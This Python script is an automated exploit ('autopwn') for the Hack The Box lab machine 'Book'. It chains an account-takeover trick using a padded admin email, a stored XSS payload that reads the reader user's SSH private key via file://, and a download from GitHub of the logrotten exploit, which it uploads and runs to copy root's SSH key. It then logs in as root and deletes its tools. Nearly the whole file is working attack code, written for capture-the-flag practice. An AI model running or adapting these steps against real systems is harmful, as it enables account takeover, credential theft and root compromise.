#!/usr/bin/python

import netifaces as ni
import os
import re
import requests
import wget
import subprocess

if __name__ == "__main__":
    print("\n=========================\n|HTB book autopwn script|\n========================= \n")
    ip = raw_input("Enter ip address of target(default = 10.10.10.176) : ")
    if ip == "":
        ip = '10.10.10.176'
    print("Target ip : ") + ip

    #SET NETWORK INTERFACE
    interface = raw_input("Enter the HTB vpn interface name(default = tun0) : ")
    if interface == "":
        interface = 'tun0'
    print("HTB vpn interface : ") + interface

    #FETCH LOCAL IP ADDRESS
    ni.ifaddresses(interface)
    local_ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("Your local ip is : ") + local_ip

    #NMAP SCAN [uncomment to do nmap scan]

    """
    print("\nScanning ip '"+ ip + "' with nmap for open ports : \n")
    os.system("nmap -sV -oN nmapscan "+ip)
    f=open('nmapscan', 'r').read()
    port=re.findall(r"([0-9]*)\/tcp *open *[a-z-?]* *[a-zA-Z0-9. ]*", f)
    service=re.findall(r"[0-9]*\/tcp *open *([a-z-?]*) *[a-zA-Z0-9. ]*", f)
    version=re.findall(r"[0-9]*\/tcp *open *[a-z-?]* *([a-zA-Z0-9. ]*)", f)
    for i in range(0,len(port),1):
        print "port "+port[i] + " : " + service[i] + " : " + version[i] + "\n"

    """
    url = "http://"+ip

    #new web_user signup and login
    print "\nSigning up as user with email : mishal.htb and password : test123"
    urequest = requests.session()
    urequest.post(url=url, data=dict(name='user', email='user@mishal.htb          1', password='test123'))
    urequest.post(url=url, data=dict(email='user@mishal.htb', password='test123'))            
    os.system("touch test.pdf;echo '' > idrsa")
    myfile =  open("test.pdf","rb")
    mi5hal = urequest.post(url=url+'/collections.php', data={'title':"<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) };x.open('GET','file:///home/reader/.ssh/id_rsa'); x.send(); </script>",'author':'mishal','Upload':'Upload'}, files={'Upload':myfile})
    if mi5hal.text.find("Thanks for the submission") > 1:
        print "\nScript uploaded to exploit dynamic pdf and read SSH key"

    #web_admin change password and login
    arequest = requests.session()
    arequest.post(url=url, data=dict(name='admin', email='admin@book.htb          1', password='test123'))
    cookie = arequest.cookies.get_dict()
    arequest.post(url=url+'/admin/', data=dict(email='admin@book.htb', password='test123', cookies = cookie)) 
    print "\nModified web admin password to 'test123' email : admin@book.htb"
    r2 = arequest.get(url = 'http://10.10.10.176/admin/collections.php?type=collections', cookies = cookie, allow_redirects=True)
    open('idrsa.pdf','wb').write(r2.content)
    os.system("pdf2txt idrsa.pdf > id_rsa; expand -t 1 id_rsa > idrsa")
    os.system("chmod 600 idrsa; rm id_rsa;rm test.pdf idrsa.pdf")
    print "\nGrabbed SSH key for user 'reader' from target "
    wget.download("https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c") 
    print "\nDownloaded logrotten.c from web for privilege escalation"
    subprocess.call("scp -i idrsa logrotten.c reader@10.10.10.176:.",shell=True)
    print "\nUploaded logrotten.c to target through SCP with SSH key of user : reader\nStarting privilege escalation"
    subprocess.call("ssh -i idrsa reader@10.10.10.176 'gcc -o logrotten logrotten.c ;echo cp /root/.ssh/id_rsa /home/reader/payload\;chmod 777 /home/reader/payload > payloadfile ; chmod +x payloadfile; echo a > backups/access.log ; ./logrotten -p payloadfile backups/access.log ;echo Wait 50 seconds to exploit logrotate'",shell=True)
    for i in range(0,101,10):
        print(str(i) +"% complete...")
        os.system("sleep 10")

    subprocess.call("scp -i idrsa reader@10.10.10.176:payload id_rsaroot",shell=True)


    os.system("chmod 600 id_rsaroot;rm logrotten.c")

    os.system("ssh -i id_rsaroot root@10.10.10.176")
    os.system("ssh -i idrsa reader@10.10.10.176 'rm logrotten logrotten.c payloadfile payload'")
    print "\n SSH key of user 'reader' and 'root' is saved as idrsa and id_rsaroot respectively in current folder which can be used to login with using exploit..."
  
  
